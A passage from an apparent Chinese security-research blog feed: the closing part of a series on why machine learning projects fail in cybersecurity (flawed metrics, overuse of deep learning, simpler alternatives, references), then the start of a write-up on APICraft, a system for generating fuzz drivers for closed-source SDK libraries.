泄露的数据而安全团队依然不知道。如果为了追求基准事实而仅仅依赖某些攻击评测手段，例如邀请蓝军攻击等，其受限的攻击场景也会片面评估模型的效果。如果数据科学团队因为任何原因应允了类似的指标，团队会为此付出大量的人力和资源，最终以不能解决问题而失败收场。</p><p>除了常规的准确率召回率等指标，数据模型还应该有面对未知情况的茁壮性、可解释性、可运营条件等，否则该模型的有效性只停留在已知的固定数据集而不能成为可靠的生产环境流程。</p><h2 id="错误之三独立检出的诅咒">错误之三：独立检出的诅咒</h2><p>检测类的模型是机器学习模型在网络安全行业的热门话题，例如恶意二进制文件/脚本检测、钓鱼页面检测等，其超越已有规则模型或者第三方情报的独立检出常常被用来当作评估指标。这个看似合理的指标在实际工作中带来了不少的问题，不限于以下这些：</p><ul><li>检出样本的商业价值更多在其可以影响的业务资产而非样本个数，评估过程也忽略了检出时间的先后次序带来的影响。</li><li>缺失准确率等质量评估的规则模型的结果作为分母不足以合理的计算独立检出率</li><li>使用完全不同方法的规则与机器学习模型的结果常有大量重合，仅评估机器学习模型而忽视规则模型的独立检出指标，这也常引发评估公正性的讨论。</li></ul><p>本文作者甚至观察到，某些安全团队一方面排斥数据模型的检测结果，一方面从数据模型的结果提取规则加入自己的检测库，通过提高分母的办法让数据科学团队的独立检出率保持在较低水平。安全团队口中的“机器学习没有用”和数据科学团队提出的“安全团队又当运动员又当裁判员”等观点均来源于此，这些无意义的内部竞争消耗了多个团队的精力和信任，最终造成了公司层面的人员流失和经济损失。独立检出这一指标带来了割裂团队阻止合作的诅咒。</p><h2id="荣誉提名正确的指标错误的问题">荣誉提名：正确的指标，错误的问题</h2><p>我们在实际工作中也观察到，有些网络安全问题问题本身不适合机器学习和人工智能，比如利用第三方情报检测未知APT攻击等目标；想要构建基于日志的威胁发现，然而忽略了所需要的数据采集和数据仓库工作；某些问题本身需要巨大投入，而现有资源不足以支撑，最常见的是各个公司热衷于自研反病毒引擎；或者是该问题本身并不存在，比如说机器学习生成安全运营的告警白名单，而白名单本身就是个伪命题。这些问题都可以设立明确的指标，但是其目标本身是个错误的问题，最终导致数据科学团队无功而返。</p><h2 id="一些设计评估指标的建议">一些设计评估指标的建议</h2><p>所有的指标必须以目标为前提。目标定义了解决问题的有限责任，只有在有限责任下才可以提出合理的指标。我们必须总是保证目标优先，而指标只是在保证目标时候的关键结果，需要理解商业需求制定目标而非拍脑袋拍出一个看似有道理的指标，数据科学家也需要清晰鉴别此类拍脑袋的评估标准并及时提出反馈。</p><p>在规划问题和设定目标时，应该评估该目标是否过大或者过小，该场景是否适合使用该解决方案，以及该解决方案的目标是否在合理的资源预算内。建议在规划对比业界一般解决方案和自身特定问题，按照当前情况合理安排资源。</p><p>独立检出一般是个很坏的指标，把数据模型和规则模型或者外部采购放到了对立面，同时忽略了检出样本对资产的影响以及检测时间先后等因素。对于检测类的模型，我们尽量避免将独立检出作为指标，而使用交集并集看检出结果的总体覆盖率和对资产的影响；如需对比模型应该看检测时间先后而非鼓励规则模型获取独检结果后更新规则以取代数据模型；同时考虑到作为基础模型的规则模型解决的是该问题较为容易部分，机器学习模型的独立检出应该以大于零为指标，并考虑下一轮迭代更新的代价。</p><p>如果没有基准事实或攻击方测试怎么办？在缺少基准事实的情况下，尽可能多的异常检测以及尽可能多的解释这些异常发生的原因，能够解释异常结果的召回率可能是更好的评估指标。在缺少攻击方测试的情况下，可以利用防守方对资产所需的防守面的覆盖程度评估攻击检测的指标。在网络安全这一动态对抗环境下，我们也必须主动且及时调整评估策略。</p><h2 id="总结-2">总结</h2><p>合理的评估指标可有效的促进数据和安全模型在其业务领域体现商业价值，我们需要设定符合目标的合理评估指标。数据科学团队也需要深刻理解算法总是被激励去预测多数群体的行为，并合理设计评价指标以发挥算法模型的优势。</p><p>合理的指标也可以避免对模型的无谓优化甚至错误优化。无论该模型的优化目标是否正确合理，聪明的数据科学家可以将建模工作做的很出色，而脱离了合理的指标，优化的越好带来的错误就越多，其最终带来的商业损失和工作的挫败感需要更多的代价来平复。</p><h1 id="机器学习不是万能灵药">机器学习不是万能灵药</h1><p>这是本系列文章的最后一篇，我们从问题求解的角度来讨论机器学习解决网络安全问题时失败的另一个原因，机器学习在解决某些问题时，有时是方法的用法不对，有时是方法和问题根本不适合。</p><ul><li>深度学习不是一切</li><li>机器学习仅是人工智能领域之一</li><li>“你是否考虑过更简单的方法？”</li></ul><h2 id="深度学习不是一切">深度学习不是一切</h2><p>我们见到很多谈机器学习就必谈深度学习的场景。深度神经网络在图像文本等领域表现了深层网络对特征表示学习（representationlearning）的强大优势，加之由神经网络带来的迁移学习（transferlearning）在解决多个问题时的神奇效果，它对解决网络安全问题的思路带来不小的冲击，大家都想试试看网络安全问题能不能因此受益。不过”天下没有免费午餐“，神奇的深度学习用其适用性作为代价换来了部分问题的解决，过去的几年里涌现的失败案例给我们总结了一些经验。</p><p>特征表示对网络结构的选择需要建构在对问题和模型的理解上。网络安全领域里序列模型似乎最为受宠，RNN/LSTM因为其简单的开源实现而备受关注，于是我们在各个问题上都可以看到它的身影，比如之前提到的LSTM 预测 DGA 算法的多个工作，其本意是寻找模型拟合 DGA背后的伪随机数生成器（PRNG）。抛开 DGA可能使用异或、位移、素数变换等多种不同的 PRNG 组合导致 LSTM等浅层网络很难有效完整拟合并解释，LSTM 对初始状态的记忆和依赖也会对 PRNG的拟合效果适得其反。Mostafa Hassan “Cracking Random Number Generatorsusing Machine Learning – Part 1: xorshift128” <code>*</code> 抛开 LSTM而只设计使用了 Dense Network 即可对基于 <code>xorshift128</code> 的 PRNG做到很好的拟合，文中也对比了 LSTM + Dense Network的实验效果，并对拟合结果做了了分析，有兴趣的小伙伴可以继续阅读。</p><p>机器学习行业有一句俗话，“垃圾进，垃圾出”。网络安全问题有多样的输入，而深度神经网络并不是关于特征组合的通用人工智能，它需要该网络结构可以处置的合理的输入才可以通过表示学习得到特征。一个典型的例子是之前提到的<code>malconv</code>，它试图借用图像处理的方法，通过输入二进制文件的原始字节码到简单的卷积层并抽取和归纳基础特征，而简单卷积并不足以感知编译器对字节码的组合，其结果为该网络仅学习到文件头签名等特征而非与恶意行为相关的函数调用特征。在Joshua Saxe with Hillary Sanders “Malware Data Science: Attack Detectionand Attribution“<code>*</code> 这本书里分析了 opcode 和基于 opcode的相关建模工作，指令跳转或者函数输出表等作为模型的输入可以更好的支持恶意软件的检测模型。</p><p>网络安全问题有较强的对抗和动态性，它需要模型自带一些基本的假设去处理未知情况并证实其预测理由，而深度神经网络缺乏归纳偏置（Inductivebias）<code>*</code>，它对未知情况的预测很不确定也不好解释，这导致了使用深度模型时的“黑盒”困扰。如果是线性回归做拟合，我们可以观测其Y 值与以 X 向量为参数的线性函数，如果是 Logistic回归，我们可以观察其超平面对正负样本的切分情况，这些归纳偏置都可以证实（justify）模型的预测，而深度神经网络只能表明Y 是 X向量的某种非线性函数，该函数与数据增强、网络结构、激活函数、归一化等各种在训练过程中加入的约束条件有关，这导致在实际使用中很难证实预测结果的有效性，加之网络安全问题往往需要较强的领域知识做较为昂贵的验证，最近的一些增强模型可解释性的工作对此也仅有有限的缓解。一个有趣的例子是SpamAssassin 这个垃圾邮件检测的开源项目，它在历史上出现过一个神奇的bug，会把所有 2010年之后的邮件全部判别为垃圾邮件。因为在垃圾邮件这种强对抗场景里攻击方总在变换不同花样，它的Bayesian判别器按照年份调整了每个特征的权重，这本是一个合理的做法，但是训练集里没有2010年之后的数据，该判别器就本着宁可错杀也不放过的偏置将所有未知的邮件全部判断为垃圾邮件。当然，SpamAssassin的模型偏置提供了方便理解的证实预测的理由，这个问题很快就被找到并修复。</p><p>同样，因为网络安全领域每个问题个体特性和对领域知识的要求较强，不像图像、文本等常见场景可以方便复用预训练模型，这也限制了深度神经网络迁移的用武之地。总的来说，深度学习作为机器学习的一个子类，它远不能让人随手一箭八百里外射下雄鹰，它的技术优势伴随着应用的局限，我们需要合理的使用该方法而不是盲目套用。</p><h2 id="机器学习人工智能">机器学习«人工智能</h2><p>《人工智能：一种现代方法》将“机器学习”放在第五单元，大家常说的“基于样本的学习”是该单元下第十九章（以2019年第四版为准）。人工智能作为学术领域方向，它还包括搜索、规划、逻辑、推理、知识表示、感知与行动等多方面，它在问题求解的应用方式应该是多个子方向的结合而不局限于机器学习。举例来说，AlphaGo这个人工智能的标杆应用的成功来自于深度神经网络与蒙特卡洛树搜索方法（MonteCarlo tree search(MCTS)）的结合，而后者是每一本人工智能教材里介绍状态搜索都会提到的算法，而AlphaGo 加入了深度网络的特征抽取与对抗训练，将 MCTS算法的涉猎范畴从课本里的五子棋一举提高到了广大媒体欢呼的围棋。</p><p>机器学习之外的其他人工智能方法在网络安全领域问题也有不少例子。这里仍然有一个有趣的例子：攻击方试图利用N 个漏洞及其组合试探目标的 K 个攻击点，每次必须使用 N 个漏洞中的 K个测试，且漏洞利用的顺序与结果相关。在若干轮测试之后，攻击方只得到一些失败的组合以及其失败的原因，可能是挑选的K个漏洞部分已经失效（只知道个数但是很难知道哪一部分），可能是漏洞组合顺序不对等，我们能否根据已知测试结果设计更有效的漏洞组合设计新的测试策略？更难的问题是，是否可以设计根据上一轮结果做出调整的自动化的策略？这个问题可以通过状态空间搜索完成。如果将其简化，各位小朋友们会发现它和3位密码锁的谜题<code>*</code>很相似，从0-9十个数字里挑选三个数组成密码，从错误的密码中总结出规律，得到正确的密码。三位密码锁的问题（N=10，k=3）可以通过暴力搜索000 到 999 的各种组合并验证其是否会掉进已知错误，但如果 N 很大，k也较大的情况，我们必须使用上面提到的 MCTS搜索并设计合理的剪枝条件（比如可能触发部分漏洞无效的漏洞组合等）减少搜索空间，可以引入主动学习（activelearning）的办法按照提出的测试方法及其反馈调整搜索方向。这类问题统称为MasterMind<code>*</code> 问题，感兴趣的小伙伴可以自行参考阅读。</p><p>在问题求解中，机器学习与非机器学习方法不应该互相排斥，而需要通力合作。基于样本的学习总会有由样本带来的局限性，它需要别的模型帮它“向其他地方看看”（lookelsewhere）。在 NLP中常见的例子就是实体消歧，例如智能体试图理解“苹果”这个单词，它需要知道这是水果还是那个电子产品公司，它的一般方法是通过上下文关联的知识库以图谱的形式推断“苹果”在语境中的意义。类似的方法在网络安全里也有不少结合了图模型与知识图谱的例子，比如本文作者团队去年发表的工作“Honeypot + graph learning + reasoning = scale up your emerging threatanalysis”<code>*</code>就是结合了序列关键模型和知识图谱，它从发现两个不同 URL在网络流量中的序列关联出发，通过构建知识图谱将URL、二进制哈希值、对应的检测结果等上下文信息连接起来，再通过图模型中链接预测（linkprediction）算法询问图谱是否能找到一条语义路径可以解释两个 URL之间的关联，并利用了一阶逻辑（first orderlogic）的推理方法保证语义路径在充分但不必要和必要但不充分条件存在时的合理性，从而达到预测未知恶意软件下载途径的结果。</p><p>当然，本文不能包含人工智能方法下的各种子方法及其组合解决网络安全问题的方案，以上几个例子仅为抛砖引玉，更多的方法和组合方式留给各位小伙伴探索。</p><h2 id="你是否考虑过其他办法">你是否考虑过其他办法？</h2><p>Joshua Saxe的推特上问过一个很好的问题，当我们展示基于机器学习模型的成果时，我们有没有考虑过更简单的办法？<code>*</code>这些简单方法可以来自于理解领域知识并对其一般化表示，也可以来自于对数据的预处理，也可以对目标问题的认真理解与分拆等各个方面。</p><p>之前有某位小伙伴从课题研究中提出一个有意思的问题：在目标资产侦查阶段，攻击方通过子域名枚举爆破方法（subdomainenumeration），利用字典单词组合去猜测目标子域名，能不能通过收集其 DNS流量并使用机器学习的办法破解其原始字典内容呢？在他尝试抄起 GPU 跳入 BERT等深度模型之前，我建议不妨试试先把数据排序用相邻字串的最长公共子串猜测一个含有噪声的字典，再用这个字典去切分子域名，将字典问题变成字符串切分问题。随后的实验证明，这种更简单的算法不仅可以有效得到绝大部分字典，并且可以灵活对抗插入的噪声。</p><p>机器学习的优势是从数据中学习其统计表示，直观的认为是它拟合规则，但问题求解并不排斥由领域知识直接带来的规则，即使该规则只能部分的解决问题。例如Alexa Rank 这个全球网站排名常被用来当作恶意软件 C&amp;C域名检测结果的参考，它包含的领域知识是”恶意软件不太可能利用高排名域名当作C&amp;C“。随着新的商业模式和攻防对抗，Alexa Rank也被攻击方利用，本文作者和同事也通过 DNS流量构建了更符合网络安全的域名信誉排名方法<code>*</code>，请有兴趣的小伙伴自行阅读。</p><p>更简单的方法也可来自于数据的筛选。正如好的食材只需要简单的烹饪即可迸发其香味，好的数据只需要简单的模型即可带来清晰的结果。一个有意思的例子来自于本文作者与前同事讨论他的文章Asaf Nadler et al “Detection of Malicious and Low Throughput DataExfiltration Over the DNS Protocol”<code>*</code> 在 DNS数据流中检测低吞吐隧道这样常用在 APT 攻击中的数据渗出方法。因为低吞吐DNS 隧道的信号很弱也很罕见，文中用独立森林（IsolationForest）做异常检测需要细致的筛选特征，导致它在大规模有噪声的数据下很难表现其检测威力，也因为算力的问题限制了其解决问题的规模。我们在讨论中发现，如果在DNS数据流中对所有未见过的域名做一轮筛选并以此作为独立森林模型的输入，其预测表现和算力均可满足大规模数据流的要求。通过深入理解目标问题的场景，我们简单的调整了更合适的输入数据使得现有模型可以更上一层楼。</p><p>更简单的方法也可以来自于分拆目标问题，它可能是代表部分目标问题的子目标，也可以是目标问题的抽象降解（reduction）等，这些均遵循问题求解的一般方法，请有兴趣的小伙伴自行探索。一个有趣的例子是，本文作者与团队发表在Botconf 工作 “Math + GPU + DNS = Cracking Locky Seeds in Real Timewithout Analyzing Samples”<code>*</code>，它在 DNS 数据流中检测 Locky勒索软件的 DGA 域名，通过 GPU 暴力破解其 DGA的种子并成功预测其未来域名。在这个工作中，我们将这一较难的问题分多步骤拆分和降解，并复用了之前工作中的异常模型和关联模型：</p><ul><li>Locky DGA 域名均为新域名，所以在 DNS异常检测并筛选从未见过的域名</li><li>Locky DGA 含有多个域名，所以我们通过 <code>domain2vec</code>计算异常域名之间的序列关联而仅对较强关联的族群测试其 DGA 属性。</li><li>Locky通过伪随机数生成器生成单个长整数并以此输出域名字符串，所以我们将每个候选域名逆运算得到其对应的长整数，即可利用GPU 批量爆破该整数在当前日期下可能对应的种子。</li></ul><p>由此我们成功破解了 Locky DGA的几十个随机数种子并将其反馈给研究社区。</p><p>本文作者建议数据科学团队在思考解决每个问题时可以反复提醒自己：</p><blockquote><p>是否存在可以全部解决或者部分解决这个问题的其他办法？</p></blockquote><h2 id="总结与后记">总结与后记</h2><p>在解决问题的过程中，我们必须坚持“问题求解”为主要目的，而相关的技术选型是支持该目的的方法，这些方法之间的合作应该大于竞争。这同时也要求数据科学团队不断的拓宽视野，多留意别的领域的成熟方法以及其为何有效的根本原因，并尝试引入网络安全领域。同时，本文作者也看到很多数据科学团队积极学习网络安全的领域知识，只有这样才能更有效的寻找适合该领域问题的技术。</p><p>本文作者收到了对这系列博客不少有意义的反馈和建议，各位小伙伴们也会从“机器学习为什么失败了”的话题出发，结合自己的工作和研究延伸了不少讨论。数据模型在网络安全领域是最近几年才出现较大规模的应用，工业界里的各种问题和困难也随之而来，这些问题的求解不像图像、语音、视频、文本等领域有较为成熟的方法框架，往往需要数据科学家从问题求解的基本方法出发，将数据模型知识结合网络安全的领域知识，寻找可以切入问题的方向，这其中难免有无数的失败，这都是符合现代科研方法的可预期的失败。我也相信通过多次失败的沮丧和偶然成功的惊喜，我们可以总结足够的经验教训，构建属于网络安全领域数据模型的一般方法框架，一起构建更加安全的互联网。</p><h1 id="参考文献">参考文献</h1><ul><li>Raff et al, Malware Detection by Eating a Whole EXE <ahref="https://arxiv.org/abs/1710.09435"class="uri">https://arxiv.org/abs/1710.09435</a></li><li>Vinayakumar R., Soman K.P., DeepMalNet: Evaluating shallow and deepnetworks for static PE malware detection <ahref="https://doi.org/10.1016/j.icte.2018.10.006"class="uri">https://doi.org/10.1016/j.icte.2018.10.006</a></li><li>Coull et al, Activation Analysis of a Byte-Based Deep Neural Networkfor Malware Classification <a href="https://arxiv.org/abs/1903.04717"class="uri">https://arxiv.org/abs/1903.04717</a></li><li>Bose et al, Explaining AI for Malware Detection: Analysis ofMechanisms of MalConv <ahref="http://vigir.missouri.edu/~gdesouza/Research/Conference_CDs/IEEE_WCCI_2020/IJCNN/Papers/N-21218.pdf"class="uri">http://vigir.missouri.edu/~gdesouza/Research/Conference_CDs/IEEE_WCCI_2020/IJCNN/Papers/N-21218.pdf</a></li><li>为什么 LSTM 检测 DGA 是无用功 <ahref="https://toooold.com/2021/07/12/dga_detection.html"class="uri">https://toooold.com/2021/07/12/dga_detection.html</a></li><li>鲁迅《且介亭杂文末编·这也是生活》</li><li>Uncovering The “Unknown Unknowns”: Why Threat Hunting is a SecurityMust-Have <ahref="https://www.crowdstrike.com/blog/uncovering-the-unknown-unknowns-why-threat-hunting-is-a-security-must-have/"class="uri">https://www.crowdstrike.com/blog/uncovering-the-unknown-unknowns-why-threat-hunting-is-a-security-must-have/</a></li><li>Sophos AI YaraML Rules Repository</li><li><a href="https://github.com/sophos-ai/yaraml_rules"class="uri">https://github.com/sophos-ai/yaraml_rules</a></li><li>Augmented Intelligence to Scale Humans Fighting Botnets <ahref="https://www.botconf.eu/2017/augmented-intelligence-to-scale-humans-fighting-botnets/"class="uri">https://www.botconf.eu/2017/augmented-intelligence-to-scale-humans-fighting-botnets/</a></li><li>7 Steps to Ensure and Sustain Data Quality <ahref="https://towardsdatascience.com/7-steps-to-ensure-and-sustain-data-quality-3c0040591366"class="uri">https://towardsdatascience.com/7-steps-to-ensure-and-sustain-data-quality-3c0040591366</a></li><li>FATE (Federated AI Technology Enabler) <ahref="https://github.com/FederatedAI/FATE"class="uri">https://github.com/FederatedAI/FATE</a></li><li>曹操批注孙子兵法，“善战者无赫赫之功”</li><li>Quora “Why do we use loss functions in machine learning instead ofsimply optimizing for accuracy?” <ahref="https://www.quora.com/Why-do-we-use-loss-functions-in-machine-learning-instead-of-simply-optimizing-for-accuracy"class="uri">https://www.quora.com/Why-do-we-use-loss-functions-in-machine-learning-instead-of-simply-optimizing-for-accuracy</a></li><li>The Myth of the Impartial Machine <ahref="https://parametric.press/issue-01/the-myth-of-the-impartial-machine/"class="uri">https://parametric.press/issue-01/the-myth-of-the-impartial-machine/</a></li><li>Not even wrong <ahref="https://en.wikipedia.org/wiki/Not_even_wrong"class="uri">https://en.wikipedia.org/wiki/Not_even_wrong</a></li><li>“There are only two types of companies: Those that have been hackedand those that will be hacked.” – Robert Mueller, former Director of theFBI</li><li>Joshua Saxe with Hillary Sanders, Malware Data Science: AttackDetection and Attribution <ahref="https://nostarch.com/malwaredatascience"class="uri">https://nostarch.com/malwaredatascience</a></li><li>Mostafa Hassan, “Cracking Random Number Generators using MachineLearning – Part 1: xorshift128” <ahref="https://research.nccgroup.com/2021/10/15/cracking-random-number-generators-using-machine-learning-part-1-xorshift128/"class="uri">https://research.nccgroup.com/2021/10/15/cracking-random-number-generators-using-machine-learning-part-1-xorshift128/</a></li><li>Inductive Bias <ahref="https://en.wikipedia.org/wiki/Inductive_bias"class="uri">https://en.wikipedia.org/wiki/Inductive_bias</a></li><li>Monte Carlo tree search <ahref="https://en.wikipedia.org/wiki/Monte_Carlo_tree_search"class="uri">https://en.wikipedia.org/wiki/Monte_Carlo_tree_search</a></li><li>A step-by-step look at Alpha Zero and Monte Carlo Tree Search <ahref="https://joshvarty.github.io/AlphaZero/"class="uri">https://joshvarty.github.io/AlphaZero/</a></li><li>3 digit lock riddle: Using Prolog to solve a brain teaser (MasterMind) <ahref="https://stackoverflow.com/questions/61276283/using-prolog-to-solve-a-brain-teaser-master-mind"class="uri">https://stackoverflow.com/questions/61276283/using-prolog-to-solve-a-brain-teaser-master-mind</a></li><li>Mastermind <ahref="https://en.wikipedia.org/wiki/Mastermind_(board_game)"class="uri">https://en.wikipedia.org/wiki/Mastermind_(board_game)</a></li><li>Joshua Saxe twitter <ahref="https://twitter.com/joshua_saxe/status/1328834273214861314"class="uri">https://twitter.com/joshua_saxe/status/1328834273214861314</a></li><li>“System for Domain Reputation Scoring” Patent us 14/937699</li><li>Asaf Nadler et al “Detection of Malicious and Low Throughput DataExfiltration Over the DNS Protocol” <ahref="https://arxiv.org/pdf/1709.08395.pdf"class="uri">https://arxiv.org/pdf/1709.08395.pdf</a></li><li>“Math + GPU + DNS = Cracking Locky Seeds in Real Time withoutAnalyzing Samples” <ahref="https://www.botconf.eu/2017/math-gpu-dns-cracking-locky-seeds-in-real-time-without-analyzing-samples/"class="uri">https://www.botconf.eu/2017/math-gpu-dns-cracking-locky-seeds-in-real-time-without-analyzing-samples/</a></li><li>“Honeypot + graph learning + reasoning = scale up your emergingthreat analysis” <ahref="https://www.youtube.com/watch?v=r7KbGJPFkxQ&amp;ab_channel=botconfeu"class="uri">https://www.youtube.com/watch?v=r7KbGJPFkxQ&amp;ab_channel=botconfeu</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Security Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Machine Learning</tag>
      
      <tag>Cybersecurity</tag>
      
      <tag>ML Pitfalls</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>APICraft：Fuzz Driver Generation for Closed-source SDK Libraries</title>
    <link href="/2021/11/28/APICraft-Fuzz-Driver-Generation-for-Closed-source-SDK-Libraries/"/>
    <url>/2021/11/28/APICraft-Fuzz-Driver-Generation-for-Closed-source-SDK-Libraries/</url>
    
    <content type="html"><![CDATA[<h1 id="背景">背景</h1><p>在fuzzing过程中，安全研究员需要构建好⼀个应⽤程序⽤来接收fuzzer提供的fuzzinput，这个应⽤程序我们称之为fuzzdriver。过往的fuzzing相关研究⼤多针对于fuzzing引擎本身的优化提升，包括种⼦变异策略以及调度算法的优化，增加多维度的反馈，以及提升fuzzer速度等，这些研究已经将fuzzing研究变为红海，极其“内卷”。</p><p>而我们关注到，如何⾃动化地构建⼀个⾼质量的fuzzdriver其实是⼀个同样关键的问题。直观来看，如果⼀个fuzzdriver能够调⽤更多SDK提供的API，有更丰富的程序⾏为，那它在fuzzing过程中必然会有更⾼的覆盖率，从⽽更容易触发漏洞。因此如何⽣成⾼质量的fuzzdriver是个值得深究的研究问题。</p><p>这篇⽂章主要解决了如何针对闭源SDK⾃动化⽣成⾼质量的fuzzdriver问题。</p><h1 id="实例"><strong>1.1 实例</strong></h1><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/APICraft/01.png"alt="图 1：基于 CoreText库的两个 fuzz driver" /><figcaption aria-hidden="true">图 1：基于 CoreText库的两个 fuzzdriver</figcaption></figure><p>图1是⼀个构建fuzz driver的例⼦，以macOS CoreText库为例，图1有两个fuzzdrivers，分别是Consumer 1以及Consumer2，将具体API简化，以伪代码形式来表现（<strong>下面的序号标识了每个API调⽤，与图1相对应</strong>）：</p><ol type="1"><li>Consumer 1调用ProviderCreateWithDataAPI创建了⼀个DataProvider对象prov；</li><li>基于prov对象创建了Font对象font；</li><li>最后计算出font对象的LeadingSpace的double值。</li><li>而Consumer 2调用CreateFontDescriptorAPI创建了FontDescriptor对象desc；</li><li>再基于desc对象创建Font对象font；</li><li>最后计算font对象的LeadingSpace值。</li></ol><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/APICraft/02.png"alt="图 2：不同的fuzz driver组合⽅式" /><figcaption aria-hidden="true">图 2：不同的fuzzdriver组合⽅式</figcaption></figure><p>图2是简化出来的API调⽤序列。(a)是原始的调⽤序列，(b)是我们将Consumer1与Consumer 2进⾏了⼀个交叉变换，将Consumer 1的序列号1调⽤与Consumer2的序列号4调⽤交换，但我们会发现，这个交叉变换并没有⽤。因为1与4的调换，只是改变了从rawdata创建font对象的⽅式，并没有改变后续API调⽤的语义，后续的2-&gt;5，2-&gt;3都是没有变化的。所以我们其实是想要(c)这种的组合，将3调⽤与5调⽤组合在⼀起。并且可能由于调⽤时序的不同会有意想不到的结果。⽐如先调⽤3计算LeadingSpace的double值，再调⽤5计算LeadingSpace可能会导致整数溢出漏洞。</p><p>从这个例⼦来看单纯依赖⼈⼯进⾏fuzz driver构建耗费时间且容易出（error-prone）。需要⼀个⾃动化的框架来辅助完成这个fuzzdriver构建过程。</p><h1 id="系统总览"><strong>02 系统总览</strong></h1><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/APICraft/03.png"alt="图 3：APICraft系统总览" /><figcaption aria-hidden="true">图 3：APICraft系统总览</figcaption></figure><p>我们设计并实现了APICraft系统⽤于针对闭源SDK fuzzdriver⾃动化⽣成⼯作。图3是整体的系统框架总览。APICraft整体设计思路可以概括为Collect-Combine。</p><ol type="1"><li><p><strong>Collect</strong>：APICraft会对使⽤相关SDK的GUI应⽤程序进⾏动态trace，⽤于收集GUI应⽤程序的动态行为信息，包括GUI应⽤程序调⽤SDKAPI的data dependency以及control dependency等。</p></li><li><p><strong>Combine</strong>：随后将这些dependency解析好之后进行多目标优化的遗传算法（Multi-Objectivegenetic algorithm）的变异进化。产生合乎我们要求的fuzz driver。</p></li></ol><h1 id="框架设计"><strong>03 框架设计</strong></h1><p>框架设计章节将详细介绍APICraft框架的设计与实现细节。</p><h2 id="api-function-dependency信息收集"><strong>3.1 API FunctionDependency信息收集</strong></h2><p>⾸先是如何收集（Collect）API functiondependency信息。APICraft最终目标是想自动化的完成fuzz driver构建过程，而人工构建fuzzdriver最核⼼的部分基于SDK提供的API构建API调⽤序列，API调⽤序列包含了datadependency以及control dependency。APICraft需要收集datadependency以及controldependency信息，⽤于作为后续的多目标遗传算法的变异进化的基因/染⾊体。</p><h3 id="data-dependency"><strong>3.1.1 Data Dependency</strong></h3><h4 id="定义"><strong>3.1.1.1 定义</strong></h4><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/APICraft/04.png"alt="图 4：Data Dependency定义" /><figcaption aria-hidden="true">图 4：Data Dependency定义</figcaption></figure><p>在data dependency中，APICraft定义两个函数A与B有datadependency的关系在于，函数A的某个输⼊参数是函数B的输出参数/返回值，或者函数B的某个输⼊参数是函数A的输出参数/返回值。如果函数A与B存在datadependency，以图4的公式来表征，即函数A的输出参数/返回值会被⽤作函数B的输⼊参数。</p><p>APICraft定义了两类的API Data Dependency：</p><ol type="1"><li><p><strong>return value</strong>：函数A的返回值（returnvalue）被⽤做函数B的输⼊参数；</p></li><li><p><strong>output parameter</strong>：函数A的输出参数（outputparamater，⼀般是以指针形式存在）被用做函数B的输⼊参数。</p></li></ol><p>如果两个API函数满足datadependency关系，那这两个API函数就有时序调⽤关系。</p><h4 id="解析"><strong>3.1.1.2 解析</strong></h4><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/APICraft/05.png"alt="图 5：APICraft实现框架图" /><figcaption aria-hidden="true">图 5：APICraft实现框架图</figcaption></figure><p>当APICraft收集完程序动态行为信息后，需要将信息解析成相应的datadependency。具体的解析步骤是：</p><ol type="1"><li><p>由图5所示，在预处理阶段，APICraft会通过SDK提供的头⽂件解析出每个API的参数与返回值的类型信息；</p></li><li><p>而参数与返回值的值是由动态获取到的，<strong>APICraft基于functioninterposition机制实现了⼀套轻量级的动态trace框架</strong>，基于该trace框架，APICraft能够获取到动态运⾏过程中API函数进入前以及退出之后的参数与返回值信息，具体包括了threadid，nestedlevel，以及会递归的将函数的参数值，返回值，输出参数值dump出来；</p></li><li><p>APICraft基于thread id来将不同线程的trace信息区分开；</p></li><li><p>APICraft会筛掉nestedlevel大于1的API。APICraft针对的API函数都是SDK头⽂件⾥⾯提供的合法调⽤API。在动态trace过程，如果某个API不是由其他API所调⽤，即由我们的GUI应⽤所调⽤，他的nestedlevel就是1，如果该API是在另外的API所调⽤的，那他的nestedlevel就是2，以此类推。在fuzzdriver⽣成的应⽤场景中，我们关注的是API函数如何正确地被GUI应⽤所调⽤，而不关注API内部调⽤的逻辑。APICraft需要演化学习的是GUI应⽤程序的程序行为逻辑，因此不关注SDK库内部调用的逻辑；</p></li><li><p>区分输出参数：如果⼀个参数类型是指针，APICraft会监控该指针指向的内容在进API函数前，以及退出API函数之后是否有变化，如果有的话，则该参数会被判别为输出参数；</p></li><li><p>结合类型（type）信息以及值（value）信息进⾏datadependency匹配：APICraft认为即使在类型信息⼀致的情况下，两个值为0的⽐对是不匹配的，因为值为0基本⽆意义。随后APICraft会将typedef给展开，如果类型不⼀致，APICraft会看两个比对对象的类型信息是否能够转换，如果（1）两个比对对象的基本类型是⼀致的，只是修饰符不⼀样，比如const这种修饰词；（2）如果是指针类型的话，并且两者指针⼤小⼀致，或者对象之⼀指针是void*类型的。上述情形都是可转换的，两个对象可被匹配上。</p></li></ol><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/APICraft/06.png"alt="图 6：Data Dependency解析算法" /><figcaption aria-hidden="true">图 6：DataDependency解析算法</figcaption></figure><p>图6所示算法是APICraft DataDependency解析算法，输⼊T是收集到的API函数的调⽤序列信息，输出R是解析完的datadependency的集合。</p><p>1.初始化阶段，R以及cache都将初始化为空；</p><p>2.算法会遍历每个函数A，在第8⾏中，算法会将output值不为0的函数加⼊cache中，cache是个字典类型，key为output的值，value为函数A的output实例；</p><p>3.在第4⾏中，算法会遍历函数的每个输⼊参数（inputparameter），用输⼊参数的值（value）当作key从cache中取出相应的函数的output，看看是否有函数的输⼊参数与另外函数的output类型与值匹配上的。如果有的话就加到集合R中。</p><h4 id="dependency推测"><strong>3.1.1.3 Dependency推测</strong></h4><p>除了通过动态trace收集到的API data dependency关系，有些合理的API 